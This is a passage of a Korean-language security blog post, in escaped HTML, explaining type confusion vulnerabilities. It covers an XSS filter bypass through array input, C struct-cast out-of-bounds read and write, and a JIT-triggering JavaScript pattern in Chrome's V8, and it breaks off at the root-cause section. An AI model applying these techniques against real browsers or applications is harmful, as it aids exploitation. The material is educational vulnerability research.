&#xC758;&#xBBF8;&#xD569;&#xB2C8;&#xB2E4;. &#xAC04;&#xB2E8;&#xD788; &#xB9D0;&#xD574;, &#xC6B0;&#xB9AC;&#xAC00; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xBCC0;&#xC218;&#xC758; &#xB370;&#xC774;&#xD130; &#xC885;&#xB958;&#xB97C; &#xAD6C;&#xBD84;&#xC9D3;&#xB294; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xC8E0;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;:</p><ul><li><strong>&#xC815;&#xC218;</strong>(Integer): &#xC22B;&#xC790; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;</li><li><strong>&#xBB38;&#xC790;</strong>(Char): &#xB2E8;&#xC77C; &#xAE00;&#xC790; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC800;&#xC7A5;</li><li><strong>&#xBC30;&#xC5F4;</strong>(Array): &#xC5EC;&#xB7EC; &#xB370;&#xC774;&#xD130;&#xB97C; &#xD558;&#xB098;&#xB85C; &#xBB36;&#xC74C;</li></ul><p>&#xC774;&#xCC98;&#xB7FC; &#xD0C0;&#xC785;&#xC740; &#xD504;&#xB85C;&#xADF8;&#xB798;&#xBC0D; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xB370;&#xC774;&#xD130;&#xB97C; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xAE30;&#xBCF8; &#xB2E8;&#xC704;&#xB85C;, &#xC815;&#xD655;&#xD55C; &#xD0C0;&#xC785;&#xC774; &#xC9C0;&#xC815;&#xB418;&#xC5B4;&#xC57C; &#xCEF4;&#xD4E8;&#xD130;&#xAC00; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC62C;&#xBC14;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; &#xB9CC;&#xC57D;, &#xC5B4;&#xB5A4; &#xB370;&#xC774;&#xD130;&#xAC00; &#xC6D0;&#xB798; <code>&#xC815;&#xC218;</code>&#xC5EC;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC2E4;&#xC218;&#xB85C; (&#xD639;&#xC740; &#xC758;&#xB3C4;&#xC801;&#xC73C;&#xB85C;) <code>&#xBB38;&#xC790;</code>&#xB098; <code>&#xAC1D;&#xCCB4;</code>&#xCC98;&#xB7FC; &#xB2E4;&#xB904;&#xC9C4;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;? &#xC774;&#xB85C; &#xC778;&#xD574;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; side effect&#xB97C; &#xC608;&#xCE21;&#xD560; &#xC218; &#xC5C6;&#xACE0;  &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; &#xC608;&#xC0C1;&#xCE58; &#xBABB;&#xD55C; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><h3 id="1-2-Type-Confusion-&#xC720;&#xD615;"><a href="#1-2-Type-Confusion-&#xC720;&#xD615;" class="headerlink" title="1.2. Type Confusion &#xC720;&#xD615;"></a>1.2. Type Confusion &#xC720;&#xD615;</h3><p><strong>Type Confusion</strong>&#xC740; &#xC77C;&#xBC18;&#xC801;&#xC73C;&#xB85C; &#xB2E4;&#xB978; &#xCDE8;&#xC57D;&#xC810; &#xBD84;&#xB958;&#xC640; &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C;, &#xADF8; &#xC601;&#xD5A5;&#xC5D0; &#xB530;&#xB77C; Logical Bug&#xC640; Memory Corruption &#xB450; &#xAC00;&#xC9C0; &#xC720;&#xD615;&#xC73C;&#xB85C; &#xB098;&#xB20C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. </p><ul><li><strong>Logical Bug</strong></li></ul><p><strong>Logical Bug</strong> &#xC720;&#xD615;&#xC740; &#xD0C0;&#xC785;&#xC5D0; &#xB530;&#xB77C; &#xB2EC;&#xB77C;&#xC9C0;&#xB294; &#xB85C;&#xC9C1; &#xCC98;&#xB9AC;&#xAC00; &#xC798;&#xBABB; &#xB3D9;&#xC791;&#xD558;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xB9CE;&#xC740; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C; &#xC5F0;&#xC0B0;&#xC790;&#xB098; &#xB0B4;&#xC7A5; &#xBA54;&#xC11C;&#xB4DC;&#xB294; &#xC785;&#xB825; &#xD0C0;&#xC785;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xB978; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xB3D9;&#xC791;&#xD569;&#xB2C8;&#xB2E4;. &#xD0C0;&#xC785;&#xC774; &#xD63C;&#xB3D9;&#xB418;&#xBA74;, &#xC758;&#xB3C4;&#xD55C; &#xD750;&#xB984;&#xACFC; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xACB0;&#xACFC;&#xAC00; &#xB098;&#xD0C0;&#xB0A0; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xAC00; &#xC804;&#xCCB4; &#xC5B4;&#xD50C;&#xB9AC;&#xCF00;&#xC774;&#xC158; &#xCF54;&#xB4DC; &#xC911; &#xC77C;&#xBD80;&#xB85C; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="image%202.png" alt="image.png"></p><p>&#xAC1C;&#xBC1C;&#xC790;&#xAC00; XSS &#xBC29;&#xC9C0;&#xB97C; &#xC704;&#xD574; &#xD2B9;&#xC815; &#xC785;&#xB825;&#xAC12;&#xC5D0; &#xB300;&#xD574; <code>&lt;</code> &#xBB38;&#xC790;&#xAC00; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB294;&#xC9C0;&#xB97C; &#xAC80;&#xC0AC;&#xD558;&#xB294; &#xD544;&#xD130;&#xB97C; &#xAD6C;&#xD604;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xAC80;&#xC0AC; &#xB300;&#xC0C1;&#xC774; &#xBB38;&#xC790;&#xC5F4;&#xC77C; &#xAC83;&#xC73C;&#xB85C; &#xC608;&#xC0C1;&#xD558;&#xACE0; &#xD544;&#xD130;&#xB97C; &#xAD6C;&#xD604;&#xD588;&#xC9C0;&#xB9CC;, &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xBB38;&#xC790;&#xC5F4;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xBC30;&#xC5F4; &#xAC1D;&#xCCB4;&#xAC00; &#xC804;&#xB2EC;&#xB41C;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;? &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; &#xC774; &#xAC1D;&#xCCB4;&#xB97C; &#xC9C1;&#xC811; &#xAC80;&#xC0AC;&#xD560; &#xACBD;&#xC6B0; <code>&lt;</code>&#xC774; &#xD3EC;&#xD568;&#xB418;&#xC5B4; &#xC788;&#xB354;&#xB77C;&#xB3C4; &#xBE44;&#xAD50; &#xACB0;&#xACFC;&#xAC00; <code>false</code>&#xAC00; &#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xD544;&#xD130; &#xC6B0;&#xD68C;&#xB97C; &#xC57C;&#xAE30;&#xD558;&#xBA70;, &#xACB0;&#xACFC;&#xC801;&#xC73C;&#xB85C; XSS(Cross-Site Scripting)&#xB098; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xACFC; &#xAC19;&#xC740; &#xC2EC;&#xAC01;&#xD55C; &#xB17C;&#xB9AC;&#xC801; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Memory Corruption</strong></li></ul><p><strong>Memory Corruption</strong> &#xC720;&#xD615;&#xC740; &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xCE90;&#xC2A4;&#xD305;&#xC73C;&#xB85C; &#xC778;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC774; &#xC5B4;&#xAE0B;&#xB098;&#xBA74;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xCE58;&#xBA85;&#xC801;&#xC778; &#xCDE8;&#xC57D;&#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; C/C++ &#xAC19;&#xC740; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C;&#xB294; &#xAC1D;&#xCCB4;&#xC758; &#xD06C;&#xAE30;&#xB098; &#xAD6C;&#xC870;&#xB97C; &#xC798;&#xBABB; &#xD574;&#xC11D;&#xD55C; &#xACB0;&#xACFC;, &#xC778;&#xC811;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC758;&#xB3C4;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xC811;&#xADFC;(Out-Of-Bounds Read/Write) &#xC774; &#xAC00;&#xB2A5;&#xD574;&#xC9C0;&#xBA70;, &#xC774;&#xB294; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC758; &#xC548;&#xC815;&#xC131;&#xACFC; &#xBCF4;&#xC548;&#xC744; &#xC704;&#xD611;&#xD558;&#xB294; &#xC8FC;&#xC694; &#xC6D0;&#xC778;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    <span class="hljs-keyword">int</span> value[<span class="hljs-number">2</span>];} SmallStruct;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> {</span>    <span class="hljs-keyword">int</span> data[<span class="hljs-number">4</span>];} LargeStruct;SmallStruct normal = {<span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>};print_memory((<span class="hljs-keyword">int</span>*)&amp;normal , <span class="hljs-keyword">sizeof</span>(normal)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)); <span class="hljs-comment">// SmallStruct &#xBC30;&#xC5F4;&#xC744; LargeStruct&#xB85C; &#xCE90;&#xC2A4;&#xD305;</span>LargeStruct* confused = (LargeStruct*)&amp;normal ;confused-&gt;data[<span class="hljs-number">2</span>] = <span class="hljs-number">0xdead</span>; <span class="hljs-comment">// OOB Write</span>confused-&gt;data[<span class="hljs-number">3</span>] = <span class="hljs-number">0xbeef</span>;print_memory((<span class="hljs-keyword">int</span>*)&amp;normal, <span class="hljs-keyword">sizeof</span>(LargeStruct)/<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">int</span>)); <span class="hljs-comment">// OOB Read</span></code></pre><p>&#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C; <code>SmallStruct</code>&#xB294; &#xC815;&#xC218; &#xB450; &#xAC1C;&#xB97C; &#xB2F4;&#xACE0; &#xC788;&#xB294; &#xAD6C;&#xC870;&#xCCB4;&#xC785;&#xB2C8;&#xB2E4;. &#xBC18;&#xBA74;, <code>LargeStruct</code>&#xB294; &#xC815;&#xC218; &#xB124; &#xAC1C;&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xBC30;&#xC5F4;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xAC1C;&#xBC1C;&#xC790;&#xAC00; <code>SmallStruct</code> &#xBC30;&#xC5F4;&#xC744; <code>LargeStruct</code> &#xD3EC;&#xC778;&#xD130;&#xB85C; <strong>&#xC798;&#xBABB; &#xCE90;&#xC2A4;&#xD305;</strong>&#xD558;&#xBA74;, &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC740; <code>normal</code>&#xC758; &#xD06C;&#xAE30;&#xB97C; <code>LargeStruct</code>&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xB808;&#xC774;&#xC544;&#xC6C3;&#xC73C;&#xB85C; &#xC624;&#xC778;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xCD9C;&#xB825; &#xACB0;&#xACFC;&#xB97C; &#xBCF4;&#xBA74;,</p><p><img src="image%203.png" alt="image.png"></p><p><code>SmallStruct</code>&#xAD6C;&#xC870;&#xCCB4;&#xC758; &#xBC94;&#xC704;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xC601;&#xC5ED;&#xC774; &#xC4F0;&#xAE30;&#xB85C; &#xC778;&#xD574; &#xBCC0;&#xD615;&#xB418;&#xC5C8;&#xC74C;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC989;, <code>confused-&gt;data[2]</code>&#xC640; <code>data[3]</code>&#xB294; &#xC2E4;&#xC81C; <code>normal</code>&#xC758; &#xC815;&#xC758;&#xB41C; &#xAD6C;&#xC870;&#xCCB4; &#xD06C;&#xAE30;&#xB97C; &#xB118;&#xC5B4;&#xC11C; &#xC811;&#xADFC;&#xD55C; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB97C; &#xB3C4;&#xC2DD;&#xD654;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image%204.png" alt="image.png"></p><p>&#xADF8;&#xB9BC;&#xC5D0;&#xC11C;&#xB294; <code>SmallStruct</code> &#xC778;&#xC2A4;&#xD134;&#xC2A4;&#xAC00; &#xCD1D; 2&#xAC1C;&#xC758; &#xC815;&#xC218; &#xACF5;&#xAC04;&#xB9CC;&#xC744; &#xCC28;&#xC9C0;&#xD558;&#xACE0; &#xC788;&#xC74C;&#xC5D0;&#xB3C4; &#xBD88;&#xAD6C;&#xD558;&#xACE0;, <code>LargeStruct</code> &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD1B5;&#xD574; &#xCD1D; 4&#xAC1C;&#xC758; &#xC815;&#xC218; &#xACF5;&#xAC04;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294; &#xAC83;&#xCC98;&#xB7FC; &#xC811;&#xADFC;&#xD558;&#xBA70; &#xBA54;&#xBAA8;&#xB9AC; &#xACBD;&#xACC4;&#xB97C; &#xCD08;&#xACFC;&#xD55C; &#xC77D;&#xAE30;/&#xC4F0;&#xAE30;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCF4;&#xC5EC;&#xC90D;&#xB2C8;&#xB2E4;.</p><h3 id="1-3-Type-Confusion-case-in-Chrome"><a href="#1-3-Type-Confusion-case-in-Chrome" class="headerlink" title="1.3 Type Confusion (case: in Chrome)"></a>1.3 Type Confusion (case: in Chrome)</h3><p>&#xC800;&#xD76C;&#xB294; &#xD06C;&#xB86C;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294; Type Confusion&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCFC;&#xAC70;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; Memory Corruption &#xB958;&#xC758; &#xB450; &#xAC00;&#xC9C0; &#xC804;&#xD615;&#xC801;&#xC778; &#xC0AC;&#xB840;(C++ / JavaScript)&#xB97C; &#xBE44;&#xAD50;&#xD558;&#xBA70; &#xD06C;&#xB86C;&#xC5D0;&#xC11C; &#xC774; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xC5B4;&#xB5BB;&#xAC8C; &#xB098;&#xD0C0;&#xB098;&#xB294;&#xC9C0;&#xB97C; &#xB354; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Type Confusion &#x2013; C++</strong></li></ul><p>&#xC815;&#xC801; &#xD0C0;&#xC785; &#xC5B8;&#xC5B4;&#xC778; C++&#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC774; &#xC8FC;&#xB85C; &#xAC1C;&#xBC1C;&#xC790;&#xC758; &#xC2E4;&#xC218;&#xB85C; &#xC778;&#xD574; &#xBC1C;&#xC0DD;&#xD558;&#xBA70;, &#xCEF4;&#xD30C;&#xC77C; &#xD0C0;&#xC784;&#xC5D0; &#xD0C0;&#xC785;&#xC774; &#xACB0;&#xC815;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; &#xC798;&#xBABB;&#xB41C; &#xBA85;&#xC2DC;&#xC801; &#xCE90;&#xC2A4;&#xD305;&#xC774; &#xC8FC;&#xB41C; &#xC6D0;&#xC778;&#xC785;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-comment">// &#xC798;&#xBABB;&#xB41C; Casting&#xC73C;&#xB85C; &#xBC1C;&#xC0DD;&#xD55C; Type Confusion</span>struct A { int x; };struct B { int y; <span class="hljs-keyword">void</span> (*func)(); };A a = {<span class="hljs-number">42</span>};B* b = (B*)&amp;a; b-&gt;func();     <span class="hljs-comment">// &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;&#xB97C; &#xD638;&#xCD9C; &#x2192; Crash &#xB610;&#xB294; &#xC784;&#xC758; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;</span></code></pre><p>&#xC704; &#xC608;&#xC81C;&#xC5D0;&#xC11C; <code>struct A</code>&#xB294; &#xC815;&#xC218;&#xD615; &#xBA64;&#xBC84; <code>x</code>&#xB9CC;&#xC744; &#xD3EC;&#xD568;&#xD558;&#xC9C0;&#xB9CC;, &#xC774;&#xB97C; <code>struct B</code>&#xB85C; &#xCE90;&#xC2A4;&#xD305;&#xD558;&#xBA74; &#xC874;&#xC7AC;&#xD558;&#xC9C0;&#xB3C4; &#xC54A;&#xB294; &#xD568;&#xC218; &#xD3EC;&#xC778;&#xD130;(<code>func</code>)&#xB97C; &#xC811;&#xADFC;&#xD558;&#xB824; &#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xB3D9;&#xC791;&#xC744; &#xC720;&#xBC1C;&#xD558;&#xBA70;, &#xC2DC;&#xC2A4;&#xD15C; &#xD06C;&#xB798;&#xC2DC;&#xAC00; &#xBC1C;&#xC0DD;&#xD558;&#xAC70;&#xB098; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC0BD;&#xC785;&#xD55C; &#xCF54;&#xB4DC;&#xAC00; &#xC2E4;&#xD589;&#xB420; &#xC218;&#xB3C4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><strong>Type Confusion &#x2013; JavaScript</strong></li></ul><p>&#xBC18;&#xBA74;, JavaScript&#xC640; &#xAC19;&#xC740; &#xB3D9;&#xC801; &#xC5B8;&#xC5B4;&#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC774; &#xAC1C;&#xBC1C;&#xC790;&#xAC00; &#xC9C1;&#xC811; &#xBA85;&#xC2DC;&#xC801;&#xC73C;&#xB85C; &#xD0C0;&#xC785;&#xC744; &#xBC14;&#xAFB8;&#xC9C0; &#xC54A;&#xC544;&#xB3C4; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788; V8&#xACFC; &#xAC19;&#xC740; &#xCD5C;&#xC2E0; JS &#xC5D4;&#xC9C4;&#xC5D0;&#xC11C;&#xB294; JIT(Just-In-Time) &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xAC00; &#xB7F0;&#xD0C0;&#xC784; &#xC131;&#xB2A5; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC704;&#xD574; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xCD94;&#xB860;&#xD558;&#xB294; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xC798;&#xBABB;&#xB41C; &#xAC00;&#xC815;&#xC744; &#xD560; &#xC218; &#xC788;&#xACE0;, &#xC774;&#xB85C; &#xC778;&#xD574; Type Confusion&#xC774; &#xC720;&#xBC1C;&#xB420; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;(&#xC790;&#xC138;&#xD55C; &#xB0B4;&#xC6A9;&#xC740; &#xB4A4;&#xC5D0;&#xC11C; &#xB2E4;&#xB8E8;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!).</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">foo</span>(<span class="hljs-params">x</span>) </span>{      <span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1.1</span>]; <span class="hljs-comment">// &#xCD08;&#xAE30;&#xC5D0; &#xC22B;&#xC790;(float)&#xAC00; &#xB4E4;&#xC5B4;&#xAC04; &#xBC30;&#xC5F4;</span>    <span class="hljs-keyword">if</span> (x) arr[<span class="hljs-number">0</span>] = {<span class="hljs-attr">y</span>: <span class="hljs-number">42</span>}; <span class="hljs-comment">// &#xC870;&#xAC74;&#xC5D0; &#xB530;&#xB77C; &#xAC1D;&#xCCB4;&#xB85C; &#xBC14;&#xAFB8;&#xB294; &#xBD84;&#xAE30;</span>    <span class="hljs-keyword">return</span> arr[<span class="hljs-number">1</span>]; <span class="hljs-comment">// OOB &#xAC00;&#xB2A5;&#xC131;</span>}<span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) foo(<span class="hljs-literal">false</span>);  <span class="hljs-comment">// &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC720;&#xB3C4;</span>foo(<span class="hljs-literal">true</span>); <span class="hljs-comment">// &#xCD5C;&#xC801;&#xD654; &#xC774;&#xD6C4; &#xAC1D;&#xCCB4; &#xC0BD;&#xC785; &#x2192; &#xD0C0;&#xC785; &#xAD6C;&#xC870; &#xBCC0;&#xACBD;</span></code></pre><p>&#xC774; &#xCF54;&#xB4DC;&#xB294; &#xCC98;&#xC74C;&#xC5D0;&#xB294; &#xBC30;&#xC5F4;&#xC774; &#xC22B;&#xC790;&#xB9CC; &#xB2F4;&#xACE0; &#xC788;&#xC5B4;&#xC11C;, V8&#xC740; &#x201C;&#xC774; &#xBC30;&#xC5F4;&#xC740; &#xC22B;&#xC790;&#xB9CC; &#xB2F4;&#xAE34;&#xB2E4;&#x201D; &#xACE0; &#xD310;&#xB2E8;&#xD558;&#xACE0;, &#xADF8;&#xC5D0; &#xB9DE;&#xAC8C; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xB97C; &#xB2E8;&#xC21C;&#xD558;&#xACE0; &#xBE60;&#xB974;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xB3C4;&#xB85D; &#xCD5C;&#xC801;&#xD654;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xC870;&#xAC74;&#xBB38;&#xC5D0; &#xB530;&#xB77C; &#xAC1D;&#xCCB4;&#xB97C; &#xBC30;&#xC5F4;&#xC5D0; &#xC0BD;&#xC785;&#xD558;&#xBA74; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xAC00; &#xBC14;&#xB00C;&#xC5B4;&#xC57C; &#xD558;&#xB294;&#xB370;, &#xC774;&#xBBF8; &#xB9CC;&#xB4E4;&#xC5B4;&#xC9C4; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xAC00; &#xC774; &#xBCC0;&#xD654;&#xB97C; &#xACE0;&#xB824;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74;, &#xC5D4;&#xC9C4;&#xC740; &#xC5EC;&#xC804;&#xD788; &#xC774; &#xBC30;&#xC5F4;&#xC774; &#xC22B;&#xC790;&#xB9CC; &#xB4E4;&#xC5B4; &#xC788;&#xB294; &#xC904; &#xC54C;&#xACE0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, &#xC6D0;&#xB798;&#xB294; &#xC22B;&#xC790;&#xB77C;&#xACE0; &#xAC00;&#xC815;&#xD588;&#xB358; &#xAC12;&#xC774; &#xC2E4;&#xC81C;&#xB85C;&#xB294; &#xAC1D;&#xCCB4;&#xC774;&#xAC70;&#xB098; &#xC804;&#xD600; &#xB2E4;&#xB978; &#xB370;&#xC774;&#xD130;&#xC77C; &#xC218; &#xC788;&#xACE0;, &#xC774;&#xB85C; &#xC778;&#xD574; &#xBA54;&#xBAA8;&#xB9AC; &#xD574;&#xC11D;&#xC774; &#xC65C;&#xACE1;&#xB418;&#xAC70;&#xB098; &#xBC30;&#xC5F4;&#xC758; &#xACBD;&#xACC4;&#xB97C; &#xBC97;&#xC5B4;&#xB09C; &#xC811;&#xADFC;(OOB)&#xC774; &#xC77C;&#xC5B4;&#xB0A0; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xCC98;&#xB7FC; &#xB7F0;&#xD0C0;&#xC784; &#xC911; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xAD6C;&#xC870; &#xBCC0;&#xACBD;&#xACFC; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC758; &#xCD94;&#xB860; &#xC0AC;&#xC774;&#xC758; &#xBD88;&#xC77C;&#xCE58;&#xB294; &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; Type Confusion&#xC758; &#xC8FC;&#xC694; &#xC6D0;&#xC778;&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="2-Type-Confusion-in-Chrome-Root-cause-Analysis"><a href="#2-Type-Confusion-in-Chrome-Root-cause-Analysis" class="headerlink" title="2. Type Confusion in Chrome - Root cause Analysis"></a>2. Type Confusion in Chrome - Root cause Analysis</h2><p>&#xC55E;&#xC11C; 1&#xC7A5;&#xC5D0;&#xC11C;&#xB294; Type Confusion&#xC758; &#xAC1C;&#xB150;&#xACFC; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xBC1C;&#xC0DD; &#xC0AC;&#xB840;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xC558;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C;&#xBD80;&#xD130;&#xB294; &#xC774; &#xAC1C;&#xB150;&#xC744; Chrome&#xC758; JavaScript &#xC5D4;&#xC9C4;&#xC778; V8&#xC5D0; &#xC801;&#xC6A9;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. V8&#xC740; JIT &#xAE30;&#xBC18;&#xC758; &#xACE0;&#xC131;&#xB2A5; &#xC5D4;&#xC9C4;&#xC73C;&#xB85C;, Type Confusion &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBE48;&#xBC88;&#xD788; &#xBC1C;&#xC0DD;&#xD558;&#xB294; &#xD658;&#xACBD;&#xC785;&#xB2C8;&#xB2E4;. &#xC131;&#xB2A5; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC704;&#xD574; V8&#xC740; &#xAC1D;&#xCCB4;&#xC758; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xB0B4;&#xBD80;&#xC801;&#xC73C;&#xB85C; &#xACE0;&#xC815;&#xB41C; &#xD615;&#xD0DC;&#xB85C; &#xC720;&#xC9C0;&#xD558;&#xB824;&#xACE0; &#xD558;&#xBA70;, &#xC774;&#xB85C; &#xC778;&#xD574; &#xD2B9;&#xC815; &#xC870;&#xAC74;&#xC5D0;&#xC11C; &#xD0C0;&#xC785; &#xCD94;&#xB860; &#xC624;&#xB958;&#xAC00; &#xBA54;&#xBAA8;&#xB9AC; &#xC190;&#xC0C1;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xC7A5;&#xC5D0;&#xC11C;&#xB294; V8 &#xB0B4;&#xBD80;&#xC5D0;&#xC11C; Type Confusion&#xC774; &#xC5B4;&#xB5A4; &#xAD6C;&#xC870;&#xC801; &#xBC30;&#xACBD;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD558;&#xB294;&#xC9C0;, &#xADF8;&#xB9AC;&#xACE0; Hidden Class&#xC640; ElementsKind &#xAC19;&#xC740; &#xD575;&#xC2EC; &#xAC1C;&#xB150;&#xC774; &#xC5B4;&#xB5A4; &#xC5ED;&#xD560;&#xC744; &#xD558;&#xB294;&#xC9C0;&#xB97C; 